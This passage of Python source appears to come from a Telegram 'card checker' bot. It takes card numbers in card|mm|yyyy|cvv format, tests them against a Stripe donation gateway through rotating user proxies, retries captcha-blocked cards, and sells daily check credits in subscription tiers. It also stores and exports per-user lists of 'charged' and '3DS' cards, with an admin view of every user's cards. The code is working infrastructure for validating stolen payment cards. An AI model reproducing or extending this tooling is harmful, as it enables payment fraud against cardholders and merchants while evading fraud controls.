            await query.edit_message_text("⏳ Fetching your charged cards history...", parse_mode="Markdown")
            await send_card_history(chat_id=query.message.chat_id, bot=context.bot, target_user_id=user_id, card_type="charged")
            total_count = get_card_history_count(user_id=user_id, card_type="charged")
            await query.edit_message_text(
                f"💰 *Charged Cards History*\n\n📊 Total: {total_count} cards\n\n_Check the file above for all cards._" if total_count > 0 else
                f"💰 *Charged Cards History*\n\n_No charged cards found._",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_main")]])
            )

    # 3DS cards history (from menu button)
    elif data == "menu_3ds_history":
        if is_admin(user_id):
            # Show admin submenu with options
            keyboard = [
                [InlineKeyboardButton("👤 My 3DS Cards", callback_data="3ds_my")],
                [InlineKeyboardButton("👥 All Users' Cards", callback_data="3ds_all")],
                [InlineKeyboardButton("🔍 Search by User ID", callback_data="3ds_search")],
                [InlineKeyboardButton("⬅️ Back", callback_data="menu_main")]
            ]
            await query.edit_message_text(
                "🔐 *3DS Cards History*\n\n"
                "Select an option:",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            # Regular user - show their own cards
            await query.edit_message_text("⏳ Fetching your 3DS cards history...", parse_mode="Markdown")
            await send_card_history(chat_id=query.message.chat_id, bot=context.bot, target_user_id=user_id, card_type="3ds")
            total_count = get_card_history_count(user_id=user_id, card_type="3ds")
            await query.edit_message_text(
                f"🔐 *3DS Cards History*\n\n📊 Total: {total_count} cards\n\n_Check the file above for all cards._" if total_count > 0 else
                f"🔐 *3DS Cards History*\n\n_No 3DS cards found._",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_main")]])
            )

    # Admin: My charged cards
    elif data == "charged_my":
        await query.edit_message_text("⏳ Fetching your charged cards...", parse_mode="Markdown")
        await send_card_history(chat_id=query.message.chat_id, bot=context.bot, target_user_id=user_id, card_type="charged")
        total_count = get_card_history_count(user_id=user_id, card_type="charged")
        await query.edit_message_text(
            f"💰 *My Charged Cards*\n\n📊 Total: {total_count} cards" + ("\n\n_Check the file above._" if total_count > 0 else "\n\n_No cards found._"),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_charged_history")]])
        )

    # Admin: All users' charged cards
    elif data == "charged_all":
        if not is_admin(user_id):
            await query.answer("🚫 Admin only!", show_alert=True)
            return
        await query.edit_message_text("⏳ Fetching ALL charged cards...", parse_mode="Markdown")
        await send_card_history(chat_id=query.message.chat_id, bot=context.bot, target_user_id=None, card_type="charged")
        total_count = get_card_history_count(user_id=None, card_type="charged")
        await query.edit_message_text(
            f"💰 *All Charged Cards*\n\n📊 Total: {total_count} cards from all users" + ("\n\n_Check the file above._" if total_count > 0 else "\n\n_No cards found._"),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_charged_history")]])
        )

    # Admin: Search charged cards by user ID
    elif data == "charged_search":
        if not is_admin(user_id):
            await query.answer("🚫 Admin only!", show_alert=True)
            return
        set_waiting_for(user_id, "charged_user_search")
        await query.edit_message_text(
            "🔍 *Search Charged Cards*\n\n"
            "Enter the user ID to search:\n\n"
            "Example: `123456789`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu_charged_history")]])
        )

    # Admin: My 3DS cards
    elif data == "3ds_my":
        await query.edit_message_text("⏳ Fetching your 3DS cards...", parse_mode="Markdown")
        await send_card_history(chat_id=query.message.chat_id, bot=context.bot, target_user_id=user_id, card_type="3ds")
        total_count = get_card_history_count(user_id=user_id, card_type="3ds")
        await query.edit_message_text(
            f"🔐 *My 3DS Cards*\n\n📊 Total: {total_count} cards" + ("\n\n_Check the file above._" if total_count > 0 else "\n\n_No cards found._"),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_3ds_history")]])
        )

    # Admin: All users' 3DS cards
    elif data == "3ds_all":
        if not is_admin(user_id):
            await query.answer("🚫 Admin only!", show_alert=True)
            return
        await query.edit_message_text("⏳ Fetching ALL 3DS cards...", parse_mode="Markdown")
        await send_card_history(chat_id=query.message.chat_id, bot=context.bot, target_user_id=None, card_type="3ds")
        total_count = get_card_history_count(user_id=None, card_type="3ds")
        await query.edit_message_text(
            f"🔐 *All 3DS Cards*\n\n📊 Total: {total_count} cards from all users" + ("\n\n_Check the file above._" if total_count > 0 else "\n\n_No cards found._"),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_3ds_history")]])
        )

    # Admin: Search 3DS cards by user ID
    elif data == "3ds_search":
        if not is_admin(user_id):
            await query.answer("🚫 Admin only!", show_alert=True)
            return
        set_waiting_for(user_id, "3ds_user_search")
        await query.edit_message_text(
            "🔍 *Search 3DS Cards*\n\n"
            "Enter the user ID to search:\n\n"
            "Example: `123456789`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu_3ds_history")]])
        )

    # Proxy menu
    elif data == "menu_proxy":
        settings = get_user_settings(user_id)
        proxy = settings.get("proxy")

        if proxy:
            # Handle both old (string) and new (list) format
            if isinstance(proxy, list):
                if len(proxy) == 1:
                    text = f"🌐 *Your Proxy*\n\n`{proxy[0]}`"
                else:
                    text = f"🌐 *Your Proxies* ({len(proxy)})\n\n"
                    for i, p in enumerate(proxy[:5], 1):
                        short_p = p[:35] + "..." if len(p) > 35 else p
                        text += f"{i}. `{short_p}`\n"
                    if len(proxy) > 5:
                        text += f"_...and {len(proxy) - 5} more_\n"
                    text += "\n🔄 _Bot rotates between these proxies_"
            else:
                text = f"🌐 *Your Proxy*\n\n`{proxy}`"
        else:
            text = "🌐 *Your Proxy*\n\nNo proxy set.\n\nClick ➕ Set Proxy to add one."

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_proxy_keyboard(user_id)
        )

    # Set proxy - ask for input
    elif data == "proxy_set":
        set_waiting_for(user_id, "proxy")
        await query.edit_message_text(
            "🌐 *Set Proxy*\n\n"
            "Send your proxy in this format:\n"
            "`host:port:username:password`\n\n"
            "Or send *multiple proxies* \\(one per line\\)\\.\n"
            "I'll test each one and use the first working proxy\\.\n\n"
            "_⚠️ Proxies will be validated before saving_",
            parse_mode="MarkdownV2",
            reply_markup=get_cancel_keyboard()
        )

    # Clear proxy
    elif data == "proxy_clear":
        update_user_setting(user_id, "proxy", None)
        await query.edit_message_text(
            "✅ *Proxy Cleared*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard("menu_proxy")
        )

    # Settings menu
    elif data == "menu_settings":
        settings = get_user_settings(user_id)
        proxy = settings.get("proxy")

        text = (
            "⚙️ *Your Settings*\n\n"
            f"🌐 *Proxy*: {format_proxy_status(proxy)}\n"
            f"💳 *Gateway*: Stripe\n"
        )

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Check cards info
    elif data == "menu_check_info":
        await query.edit_message_text(
            "💳 *Check Cards*\n\n"
            "*Gateway:* Stripe Donation\n\n"
            "*How to check cards:*\n\n"
            "1️⃣ Paste a card directly:\n"
            "`4111111111111111|12|2025|123`\n\n"
            "2️⃣ Send a .txt file with cards\n\n"
            "*Supported formats:*\n"
            "• `card|mm|yyyy|cvv`\n"
            "• `card|mm|yy|cvv`\n"
            "• `card:mm:yyyy:cvv`\n"
            "• `card/mm/yyyy/cvv`",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Cancel input
    elif data == "cancel_input":
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "❌ *Cancelled*",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard()
        )

    # Checking controls
    elif data == "chk_pause":
        session = get_user_session(user_id)
        session["paused"] = True
        await query.edit_message_reply_markup(reply_markup=get_checking_keyboard(paused=True))

    elif data == "chk_resume":
        session = get_user_session(user_id)
        session["paused"] = False
        await query.edit_message_reply_markup(reply_markup=get_checking_keyboard(paused=False))

    elif data == "chk_stop":
        session = get_user_session(user_id)
        session["stopped"] = True
        session["paused"] = False
        try:
            await query.edit_message_reply_markup(reply_markup=None)
        except:
            pass

    # Retry failed cards (captcha/network errors)
    elif data == "retry_failed":
        session = get_user_session(user_id)
        retriable_cards = session.get("retriable_cards", [])

        if not retriable_cards:
            await query.edit_message_text(
                "❌ No cards to retry.",
                parse_mode="Markdown",
                reply_markup=get_main_menu_keyboard(user_id)
            )
            return

        # Check if user is currently checking
        if session.get("checking"):
            await query.answer("⏳ Already checking cards!", show_alert=True)
            return

        # Check credits
        user_credits = get_user_credits(user_id)
        cards_to_check = len(retriable_cards)

        if user_credits != -1 and user_credits < cards_to_check:
            if user_credits == 0:
                await query.edit_message_text(
                    get_no_credits_message(),
                    parse_mode="Markdown",
                    reply_markup=get_subscribe_keyboard()
                )
                return
            else:
                # Limit to available credits
                retriable_cards = retriable_cards[:user_credits]
                cards_to_check = len(retriable_cards)

        # Clear the retriable cards from session
        session["retriable_cards"] = []

        # Reset session for new check
        reset_user_session(user_id)
        session = get_user_session(user_id)
        session["checking"] = True

        # Pre-fetch user settings
        user_settings = get_user_settings(user_id)

        # Show credits in status
        credits_text = f"💰 Credits: {user_credits}" if user_credits != -1 else "💰 Credits: ♾️ Unlimited"

        await query.edit_message_text(
            f"🔄 *Retrying Failed Cards*\n\n"
            f"💳 Cards to retry: {cards_to_check}\n"
            f"{credits_text}\n"
            f"⏳ Starting retry...",
            parse_mode="Markdown",
            reply_markup=get_checking_keyboard(paused=False)
        )

        # Use the query message for status updates
        status_msg = query.message

        # Create a fake update object for run_batch_check
        class FakeUpdate:
            def __init__(self, message, user):
                self.message = message
                self.effective_user = user

        fake_update = FakeUpdate(query.message, query.from_user)

        # Run the retry as a background task
        asyncio.create_task(
            run_batch_check(retriable_cards, user_id, user_settings, session, status_msg, fake_update, context.bot)
        )

    # =============================================================================
    # ADMIN PANEL CALLBACKS
    # =============================================================================

    elif data == "admin_close":
        if not is_admin(user_id):
            return
        await query.message.delete()

    elif data == "admin_users":
        if not is_admin(user_id):
            return
        try:
            users = await get_all_users_from_db()

            if users:
                text = f"👥 *All Users* ({len(users)})\n\n"
                for i, (uid, prod_count, has_proxy, created_at) in enumerate(users[:20]):
                    proxy_icon = "🌐" if has_proxy else "➖"
                    banned_icon = "🚫" if is_user_banned(uid) else ""
                    text += f"`{uid}` - {prod_count} products {proxy_icon} {banned_icon}\n"
                if len(users) > 20:
                    text += f"\n_...and {len(users) - 20} more users_"
            else:
                text = "👥 *All Users*\n\nNo users found."

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔍 View User Details", callback_data="admin_user_lookup")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=keyboard)
        except Exception as e:
            logger.error(f"Error in admin_users: {e}")
            await query.edit_message_text(
                f"❌ Error loading users:\n`{str(e)}`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
                ])
            )

    elif data == "admin_user_lookup":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_user_lookup")
        await query.edit_message_text(
            "🔍 *View User Details*\n\n"
            "Send me the user ID to look up:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_stats":
        if not is_admin(user_id):
            return
        try:
            users = await get_all_users_from_db()

            text = (
                f"📊 *System Statistics*\n\n"
                f"⏱️ *Uptime*: {get_uptime()}\n\n"
                f"👥 *Users*: {len(users)}\n"
                f"🚫 *Banned*: {len(bot_stats['banned_users'])}\n\n"
                f"💳 *Cards Checked*: {bot_stats['total_cards_checked']}\n"
                f"✅ *Charged*: {bot_stats['total_charged']}\n"
                f"❌ *Declined*: {bot_stats['total_declined']}\n"
                f"🔐 *3DS*: {bot_stats['total_3ds']}\n\n"
                f"⚡ *Concurrency*:\n"
                f"  • Global: {config.GLOBAL_CONCURRENCY_LIMIT}\n"
                f"  • Per-user: {config.CONCURRENCY_LIMIT}\n"
                f"  • Card delay: {config.CARD_DELAY}s"
            )

            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="admin_stats")],
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
                ])
            )
        except Exception as e:
            logger.error(f"Error in admin_stats: {e}")
            await query.edit_message_text(
                f"❌ Error loading stats:\n`{str(e)}`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
                ])
            )

    elif data == "admin_broadcast":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_broadcast")
        await query.edit_message_text(
            "📢 *Broadcast Message*\n\n"
            "Send me the message to broadcast to all users:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_banned":
        if not is_admin(user_id):
            return
        banned = bot_stats["banned_users"]

        if banned:
            text = f"🚫 *Banned Users* ({len(banned)})\n\n"
            for uid in list(banned)[:20]:
                text += f"`{uid}`\n"
        else:
            text = "🚫 *Banned Users*\n\nNo banned users."

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔨 Ban User", callback_data="admin_ban")],
            [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
            [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
        ])
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=keyboard)

    elif data == "admin_ban":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_ban")
        await query.edit_message_text(
            "🔨 *Ban User*\n\n"
            "Send me the user ID to ban:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_unban":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_unban")
        await query.edit_message_text(
            "✅ *Unban User*\n\n"
            "Send me the user ID to unban:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_back")]
            ])
        )

    elif data == "admin_settings":
        if not is_admin(user_id):
            return
        text = (
            "⚙️ *Bot Settings*\n\n"
            f"*Concurrency Limit*: {config.CONCURRENCY_LIMIT}\n"
            f"*Global Limit*: {config.GLOBAL_CONCURRENCY_LIMIT}\n"
            f"*Card Delay*: {config.CARD_DELAY}s\n\n"
            "_Settings can be changed via environment variables on Railway_"
        )
        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )

    # =============================================================================
    # ADMIN CREDIT/SUBSCRIPTION MANAGEMENT
    # =============================================================================

    elif data == "admin_credits":
        if not is_admin(user_id):
            return
        await query.edit_message_text(
            "💳 *Manage Credits*\n\n"
            "Choose an action:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Add Credits", callback_data="admin_add_credits")],
                [InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove_credits")],
                [InlineKeyboardButton("🔍 Check User Credits", callback_data="admin_check_credits")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )

    elif data == "admin_add_credits":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_add_credits")
        await query.edit_message_text(
            "➕ *Add Credits*\n\n"
            "Send user ID and amount:\n\n"
            "Format: `user_id amount`\n"
            "Example: `123456789 100`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_credits")]
            ])
        )

    elif data == "admin_remove_credits":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_remove_credits")
        await query.edit_message_text(
            "➖ *Remove Credits*\n\n"
            "Send user ID and amount:\n\n"
            "Format: `user_id amount`\n"
            "Example: `123456789 50`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_credits")]
            ])
        )

    elif data == "admin_check_credits":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_check_credits")
        await query.edit_message_text(
            "🔍 *Check User Credits*\n\n"
            "Send the user ID:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_credits")]
            ])
        )

    elif data == "admin_subs":
        if not is_admin(user_id):
            return
        # Show subscription stats
        conn = get_db_connection()
        tier_counts = {"free": 0, "basic": 0, "premium": 0, "unlimited": 0}
        if conn:
            try:
                cur = conn.cursor()
                cur.execute("""
                    SELECT subscription_tier, COUNT(*)
                    FROM user_settings
                    GROUP BY subscription_tier
                """)
                for row in cur.fetchall():
                    tier = row[0] or "free"
                    if tier in tier_counts:
                        tier_counts[tier] = row[1]
                cur.close()
                conn.close()
            except Exception as e:
                logger.error(f"Error fetching tier stats: {e}")

        text = (
            "🏷️ *Subscription Management*\n\n"
            "*Current Subscribers:*\n"
            f"🆓 Free: {tier_counts['free']}\n"
            f"⭐ Basic: {tier_counts['basic']}\n"
            f"💎 Premium: {tier_counts['premium']}\n"
            f"👑 Unlimited: {tier_counts['unlimited']}\n"
        )

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔧 Set User Tier", callback_data="admin_set_tier")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )

    elif data == "admin_set_tier":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, "admin_set_tier")
        await query.edit_message_text(
            "🔧 *Set User Subscription*\n\n"
            "Send user ID, tier, and days:\n\n"
            "Format: `user_id tier days`\n"
            "Tiers: `free`, `basic`, `premium`, `unlimited`\n\n"
            "Example: `123456789 premium 30`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Cancel", callback_data="admin_subs")]
            ])
        )

    elif data == "admin_back":
        if not is_admin(user_id):
            return
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "🔐 *Admin Panel*\n\n"
            "Select an option below:",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )

    elif data.startswith("admin_toggle_ban_"):
        if not is_admin(user_id):
            return
        target_id = int(data.split("_")[-1])
        if is_user_banned(target_id):
            unban_user(target_id)
            await query.answer(f"User {target_id} unbanned!", show_alert=True)
        else:
            ban_user(target_id)
            await query.answer(f"User {target_id} banned!", show_alert=True)
        # Refresh the user details view
        settings = get_user_settings(target_id)
        banned_status = "🚫 BANNED" if is_user_banned(target_id) else "✅ Active"
        proxy_status = format_proxy_status(settings.get("proxy"))
        products = settings.get("products", [])

        text_msg = (
            f"👤 *User Details*\n\n"
            f"*ID*: `{target_id}`\n"
            f"*Status*: {banned_status}\n"
            f"*Proxy*: {proxy_status}\n"
            f"*Products*: {len(products)}\n"
        )

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔨 Ban" if not is_user_banned(target_id) else "✅ Unban",
                                  callback_data=f"admin_toggle_ban_{target_id}")],
            [InlineKeyboardButton("◀️ Back", callback_data="admin_users")]
        ])
        await query.edit_message_text(text_msg, parse_mode="Markdown", reply_markup=keyboard)

async def setproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /setproxy command"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/setproxy host:port:user:pass`\n"
            "Example: `/setproxy proxy.example.com:8080:username:password`\n\n"
            "To remove proxy: `/setproxy clear`",
            parse_mode="Markdown"
        )
        return

    proxy_str = context.args[0]

    if proxy_str.lower() == "clear":
        update_user_setting(user_id, "proxy", None)
        await update.message.reply_text("✅ Proxy cleared! Using default proxy.")
    else:
        update_user_setting(user_id, "proxy", proxy_str)
        await update.message.reply_text(f"✅ Proxy set to: `{proxy_str}`", parse_mode="Markdown")


async def send_card_history(chat_id, bot, target_user_id: int, card_type: str, reply_to_message_id=None):
    """
    Helper function to send card history as a file.
    Used by both commands and callback handlers.
    card_type should be 'charged' or '3ds'
    """
    cards = get_card_history(user_id=target_user_id, card_type=card_type, limit=1000)
    total_count = get_card_history_count(user_id=target_user_id, card_type=card_type)

    emoji = "💰" if card_type == "charged" else "🔐"
    type_label = "Charged" if card_type == "charged" else "3DS"

    if not cards:
        await bot.send_message(
            chat_id=chat_id,
            text=f"📋 *{type_label} Cards History*\n\n"
                 f"👤 User: `{target_user_id}`\n"
                 f"{emoji} Total: 0 cards\n\n"
                 f"_No {type_label.lower()} cards found._",
            parse_mode="Markdown",
            reply_to_message_id=reply_to_message_id
        )
        return

    # Always send as file for all cards
    results_text = []
    for c in cards:
        timestamp = c['found_at'].strftime('%Y-%m-%d %H:%M:%S') if c['found_at'] else 'Unknown'
        line = f"{c['card']} | {timestamp}"
        if c['response_message']:
            line += f" | {c['response_message']}"
        results_text.append(line)

    file_content = "\n".join(results_text)
    file_buffer = io.BytesIO(file_content.encode('utf-8'))
    file_buffer.name = f"{card_type}_cards_{target_user_id}.txt"

    await bot.send_document(
        chat_id=chat_id,
        document=file_buffer,
        caption=f"{emoji} *{type_label} Cards History*\n\n👤 User: `{target_user_id}`\n📊 Total: {total_count} cards",
        parse_mode="Markdown",
        reply_to_message_id=reply_to_message_id
    )


async def getcharged_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handle /getcharged command - retrieve charged cards history.
    Admin can get any user's cards, regular users only their own.
    Usage: /getcharged [user_id] or /getcharged me
    """
    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)

    target_user_id = None

    # Parse arguments
    if context.args:
        arg = context.args[0].strip()

        if arg.lower() == "me":
            target_user_id = user_id
        elif arg.startswith("@"):
            # Username provided - only admin can do this
            if not is_admin_user:
                await update.message.reply_text("❌ Only admins can search by username.")
                return
            await update.message.reply_text("❌ Please use user ID instead of username.\nExample: `/getcharged 123456789`", parse_mode="Markdown")
            return
        else:
            # User ID provided
            if not is_admin_user:
                await update.message.reply_text("❌ You can only view your own charged cards.\nUse `/getcharged` or `/getcharged me`", parse_mode="Markdown")
                return
            try:
                target_user_id = int(arg)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID. Must be a number.")
                return
    else:
        # No args - get own cards
        target_user_id = user_id

    # Send card history
    await send_card_history(
        chat_id=update.effective_chat.id,
        bot=context.bot,
        target_user_id=target_user_id,
        card_type="charged",
        reply_to_message_id=update.message.message_id
    )


async def get3ds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handle /get3ds command - retrieve 3DS cards history.
    Admin can get any user's cards, regular users only their own.
    Usage: /get3ds [user_id] or /get3ds me
    """
    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)

    target_user_id = None

    # Parse arguments
    if context.args:
        arg = context.args[0].strip()

        if arg.lower() == "me":
            target_user_id = user_id
        elif arg.startswith("@"):
            if not is_admin_user:
                await update.message.reply_text("❌ Only admins can search by username.")
                return
            await update.message.reply_text("❌ Please use user ID instead of username.\nExample: `/get3ds 123456789`", parse_mode="Markdown")
            return
        else:
            if not is_admin_user:
                await update.message.reply_text("❌ You can only view your own 3DS cards.\nUse `/get3ds` or `/get3ds me`", parse_mode="Markdown")
                return
            try:
                target_user_id = int(arg)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID. Must be a number.")
                return
    else:
        target_user_id = user_id

    # Send card history
    await send_card_history(
        chat_id=update.effective_chat.id,
        bot=context.bot,
        target_user_id=target_user_id,
        card_type="3ds",
        reply_to_message_id=update.message.message_id
    )


def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return config.ADMIN_USER_ID and user_id == config.ADMIN_USER_ID


async def dbstatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dbstatus command - admin only debug command"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("🚫 This command is restricted to administrators.")
        return

    status_parts = ["🔧 *Database Status*\n"]

    # Check if PostgreSQL is available
    if not HAS_POSTGRES:
        status_parts.append("⚠️ *PostgreSQL driver*: Not installed")
        status_parts.append("📦 Using: In-memory storage (data lost on restart)")
    else:
        status_parts.append("✅ *PostgreSQL driver*: Installed")

    # Check DATABASE_URL
    if DATABASE_URL:
        # Mask the URL for security
        masked_url = DATABASE_URL[:20] + "..." if len(DATABASE_URL) > 20 else DATABASE_URL
        status_parts.append(f"✅ *DATABASE\\_URL*: Set (`{masked_url}`)")
    else:
        status_parts.append("❌ *DATABASE\\_URL*: Not set")

    # Test actual connection
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()

            # Count users
            cur.execute("SELECT COUNT(*) FROM user_settings")
            user_count = cur.fetchone()[0]
            status_parts.append(f"\n📊 *Database Stats*:")
            status_parts.append(f"• Total users: {user_count}")

            # Get recent users (last 5)
            cur.execute("""
                SELECT user_id,
                       COALESCE(array_length(products, 1), 0) as product_count,
                       proxy IS NOT NULL as has_proxy
                FROM user_settings
                ORDER BY user_id DESC
                LIMIT 5
            """)
            recent_users = cur.fetchall()

            if recent_users:
                status_parts.append(f"\n👥 *Recent Users* (last 5):")
                for row in recent_users:
                    uid, prod_count, has_proxy = row
                    proxy_icon = "🌐" if has_proxy else "➖"
                    status_parts.append(f"• `{uid}`: {prod_count} products {proxy_icon}")

            # Test write capability
            cur.execute("SELECT 1")
            status_parts.append(f"\n✅ *Connection*: Active & working")

            cur.close()
            conn.close()
        except Exception as e:
            status_parts.append(f"\n❌ *Error*: {str(e)}")
            conn.close()
    else:
        if DATABASE_URL:
            status_parts.append(f"\n❌ *Connection*: Failed to connect")
        else:
            # Show in-memory cache stats
            status_parts.append(f"\n📊 *In-Memory Stats*:")
            status_parts.append(f"• Cached users: {len(user_settings_cache)}")
            if user_settings_cache:
                for uid, settings in list(user_settings_cache.items())[:5]:
                    prod_count = len(settings.get("products", []))
                    has_proxy = settings.get("proxy") is not None
                    proxy_icon = "🌐" if has_proxy else "➖"
                    status_parts.append(f"• `{uid}`: {prod_count} products {proxy_icon}")

    # Add concurrency stats
    status_parts.append(f"\n⚡ *Concurrency*:")
    status_parts.append(f"• Global limit: {config.GLOBAL_CONCURRENCY_LIMIT}")
    status_parts.append(f"• Per-user limit: {config.CONCURRENCY_LIMIT}")
    status_parts.append(f"• Active user semaphores: {len(user_semaphores)}")

    # Show active users with semaphores
    if user_semaphores:
        status_parts.append(f"• Users with active checks:")
        for uid in list(user_semaphores.keys())[:5]:
            status_parts.append(f"  └ `{uid}`")

    await update.message.reply_text(
        "\n".join(status_parts),
        parse_mode="Markdown"
    )


async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /settings command"""
    user_id = update.effective_user.id
    settings = get_user_settings(user_id)

    proxy_status = f"`{settings['proxy']}`" if settings["proxy"] else "Default"
    products_count = len(settings["products"])

    msg = (
        "⚙️ *Your Settings*\n\n"
        f"🌐 *Proxy*: {proxy_status}\n"
        f"📦 *Products*: {products_count} URLs\n"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")


# =============================================================================
# CREDIT & SUBSCRIPTION COMMANDS
# =============================================================================

def get_subscribe_keyboard():
    """Get subscription plans keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ Basic - 100/day", callback_data="sub_basic")],
        [InlineKeyboardButton("💎 Premium - 500/day", callback_data="sub_premium")],
        [InlineKeyboardButton("👑 Unlimited", callback_data="sub_unlimited")],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="menu_main")]
    ])


async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /credits command - show current credits and subscription status"""
    user_id = update.effective_user.id
    info = get_subscription_info(user_id)

    # Build status message
    credits_display = info["credits"] if not info["is_unlimited"] else "♾️ Unlimited"
    daily_limit = info["daily_limit"] if not info["is_unlimited"] else "♾️ Unlimited"

    msg = (
        f"💳 *Your Credits*\n\n"
        f"📊 *Current*: {credits_display}\n"
        f"📅 *Daily Limit*: {daily_limit}\n\n"
        f"🏷️ *Tier*: {info['tier_name']}\n"
    )

    if info["expires"] and info["days_left"] is not None:
        msg += f"⏰ *Expires in*: {info['days_left']} days\n"

    msg += f"\n📈 *Total Cards Checked*: {info['total_checks_used']}\n"
    msg += "\n_Credits reset daily at midnight UTC_"

    await update.message.reply_text(
        msg,
        parse_mode="Markdown",
        reply_markup=get_subscribe_keyboard()
    )


async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /subscribe command - show subscription plans"""
    user_id = update.effective_user.id
    info = get_subscription_info(user_id)

    msg = (
        f"💎 *Subscription Plans*\n\n"
        f"Your current tier: {info['tier_name']}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"🆓 *Free Tier*\n"
        f"• 10 credits per day\n"
        f"• Basic features\n\n"
        f"⭐ *Basic Tier*\n"
        f"• 100 credits per day\n"
        f"• Priority support\n\n"
        f"💎 *Premium Tier*\n"
        f"• 500 credits per day\n"
        f"• Fastest processing\n"
        f"• Priority support\n\n"
        f"👑 *Unlimited Tier*\n"
        f"• Unlimited credits\n"
        f"• All features unlocked\n"
        f"• VIP support\n\n"
